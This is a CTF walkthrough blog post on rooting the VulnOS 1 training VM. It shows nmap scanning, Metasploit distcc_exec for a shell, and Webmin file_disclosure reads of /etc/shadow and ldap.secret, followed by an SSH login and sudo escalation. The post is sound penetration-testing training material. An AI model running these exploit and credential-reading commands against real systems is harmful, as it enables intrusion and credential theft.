<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the VulnOS: 1 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-vulnos-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-08-09T07:49:40+00:00">August 9, 2016</time><time class="updated" datetime="2025-06-10T20:30:43+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as VulnOS 1 presented by the <a style="color: #000000;" href="https://www.vulnhub.com/author/c4b3rw0lf,66/">c4b3rw0lf</a>. It is another Capture the Flag challenge provided for practice and its security level is for the beginners. You can download this VM from here.</span></p>
<p><span style="color: #000000;">Now let’s try to break through it.</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">Surfing HTTP service port (80)</span></li>
<li><span style="color: #000000;">Exploiting the distccd vulnerability to get files</span></li>
<li><span style="color: #000000;">Login into target machine via SSH</span></li>
<li><span style="color: #000000;">Exploiting target with SUDO rights</span></li>
<li><span style="color: #000000;">Get the Root access and the flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s Breach!</strong></span></p>
<p><span style="color: #000000;">Start off with finding the target using:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eM3PqGxaJuE/W2vxO6P-eVI/AAAAAAAAZig/0A7NSSutQr473d-2rqhHwuRUkqcOhsZEACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Our Target is 192.168.1.135, now we will scan the target for open ports and running services using nmap.</span></p>
<pre class="lang:default decode:true">nmap -sV -p- 192.168.1.135</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-khmuh6mmxeU/W2vxQZBs2rI/AAAAAAAAZjA/sH3kI-7Vb-cX6wJh_Nnx5sjUMFPLeEMNgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">From the nmap result, we can see that there are a lot of services currently running on the Target VM, Port 80, 8080 and 10000 are available for HTTP. This tells us that the HTTP Service is currently running on the Target VM. So, let’s check it out by opening it on our browser. On opening the Target VM IP-Address on the Browser we are greeted with a webpage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nWS9n3eRQSw/W2vxQTQZbrI/AAAAAAAAZjE/JquGsprwnbMBrJq1IkW4H7U_HLSxATZ6wCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">The webpage is welcoming us to VulnOS and giving us a statutory warning about not using the OS on a Live Environment. It consists a “next page&gt;” link too. After clicking on it we are told that our goal is to get root on the Target VM.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-s_5jM6GdZ9k/W2vxQpWGkVI/AAAAAAAAZjI/Cka2uuc1sOAX679jWNHmAlh7IlfAWqZhACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Back to the nmap scan, we saw that the port 8080 is open too, so we tried to open that on our browser and we get the default Tomcat “It works” page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-HQzXCR4aS-M/W2vxRJayn-I/AAAAAAAAZjM/VzOhZCPPBWApz7G-iHU-ViO4KD9-zjBFACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">After further enumerating the Target VM we get them at the port 1000 is open to and is hosting the MiniServ Webmin Page as shown in the image. As we don’t know the login credentials. Let’s try something else</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7tSwamtykBU/W2vxRarOruI/AAAAAAAAZjQ/I-e_VqebnOUpOXVCd7iYW7R3HBJb3WhBgCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Time to further enumerate, on our nmap scan we saw that we have the distcc service running on port 3632 on the Target Machine. So after a little searching over the internet, I found this <a style="color: #000000;" href="https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec">exploit</a>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ks5-Cr_ZyOM/W2vxRgnCdbI/AAAAAAAAZjU/tLql50oZNogEssilu4zsvLtmWNmXhXAoACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now, let’s try to get the shell on the Target VM using this exploit, so we opened our Metasploit framework and searched for the distcc_exec and then using the ‘use’ keyword we selected the exploit, after that we set the target VM’s IP address as rhost and then we ran the exploit, it gets us a limited shell.</span></p>
<pre class="lang:default decode:true">msf&gt; use exploit/unix/misc/distcc_exec
msf exploit(unix/misc/distcc_exec)&gt; set rhost 192.168.1.135
msf exploit(unix/misc/distcc_exec)&gt; run
</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nYV-55OAYKo/W2vxRt8CByI/AAAAAAAAZjY/kXMBB-XMx64XGX6q-DdMG6k1A0vYi-k0gCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now time to enumerate the machine with the shell we obtained, we are going to use <strong>ps </strong>command along with grep to extract all process that can run with root privileges. We are going to use this command.</span></p>
<pre class="lang:default decode:true">ps -aux | grep "root"</pre>
<p><span style="color: #000000;">As you can see that the Webmin can run with root privileges, so we are going to use it to proceed further.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q4Aife4AsNo/W2vxSBuW3pI/AAAAAAAAZjc/EUkPkANgz4oRUFm8yTqN8WVwjyLqryK0wCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now we are going to the exploit we found in the Metasploit to retrieve /etc/passwd. So that can we can escalate privilege on the Target Machine as the flag would only be accessible by the root user. This can be done as shown by using the auxiliary admin/webmin/file_disclousre</span></p>
<p><span style="color: #000000;">This exploit requires the IP Address of Target. We provided it as Rhost.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/admin/webmin/file_disclosure
msf auxiliary(admin/webmin/file_disclosure) &gt; set rhost 192.168.1.135
msf auxiliary(admin/webmin/file_disclosure) &gt; run</pre>
<p><span style="color: #000000;">And we have the /etc/passwd file of the Target but this is only the half of the job because without the shadow file this file is of no use.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Zqds_jSFz9A/W2vxO1-xwGI/AAAAAAAAZik/BHtAZfksDXA0epUjpSD8xLWK7nYGhiLNQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now we are going to extract the /etc/shadow file using the same exploit by just resetting the rpath to /etc/shadow. This can be done as shown below.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/admin/webmin/file_disclosure
msf auxiliary(admin/webmin/file_disclosure) &gt; set rhost 192.168.1.135
msf auxiliary(admin/webmin/file_disclosure) &gt; set rpath /etc/shadow
msf auxiliary(admin/webmin/file_disclosure) &gt; run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-TY4LEiJw3so/W2vxO5V4NLI/AAAAAAAAZio/pqxtPJV0_X0toKrjaexFZbo9d6pOvMl9ACLcBGAs/s1600/11.png"/></strong></span></p>
<p><span style="color: #000000;">During our initial enumeration, we also found that the target also has LDAP installed so let’s get this file too like it as it has the login credentials and the file is only be opened with the root privileges. We are going to use the same auxiliary to download the ldap.secret</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ljX8zlEqt8w/W2vxPbkFAOI/AAAAAAAAZis/VKzFqcj_LGQMvW4OPz9vasNgVG4O7tBjgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">You can too extract the ldap.secret as shown below:</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/admin/webmin/file_disclosure
msf auxiliary(admin/webmin/file_disclosure) &gt; set rhost 192.168.1.135
msf auxiliary(admin/webmin/file_disclosure) &gt; set rpath /etc/ldap.secret
msf auxiliary(admin/webmin/file_disclosure) &gt; run</pre>
<p><span style="color: #000000;">As you can see that the file contains the password “<strong>canyouhackme</strong>”.</span></p>
<p><span style="color: #000000;">Now, it is time to take this challenge to climax. Let’s login via ssh using the credentials info we gathered using the etc/passwd and ldap.secret.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-u2EzjkjCwSA/W2vxPi6Ag4I/AAAAAAAAZiw/TCc08SA5KqgSZnONVXMbhqtLKivWLsZ6gCLcBGAs/s1600/13.png"/></span></p>
<pre class="lang:default decode:true">ssh vulnosadmin@192.168.1.135
Password: canyouhackme</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MqCjSHFOToQ/W2vxPzQ6qDI/AAAAAAAAZi0/OBKu7HKPmpI-lXGt9eHNSKoRboTuACW2ACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We did get a shell but our target is to get the root so let’s further escalate the privilege of the shell using</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;">On performing sudo -l, we observed that vulnosadmin has no restrictions set and has the privilege to run ALL commands with sudo</span></p>
<pre class="lang:default decode:true ">sudo bash</pre>
<p><span style="color: #000000;">And this got us to the Root Shell. Now time to locate the flag and bring this Challenge to the End.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kkmVgmehkB4/W2vxQAkRWbI/AAAAAAAAZi8/RRcyADr4UMYOsZjDR-cic9BaLoygZvTGgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We didn’t have to search a lot for the flag, we moved to the Root Directory and we got the <strong>hello.txt</strong> which serves as the flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Yajdtb0PR2k/W2vxQABJPII/AAAAAAAAZi4/6DExvJ-aA7cFjKjSh2sm7NMzVuad5FRqgCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
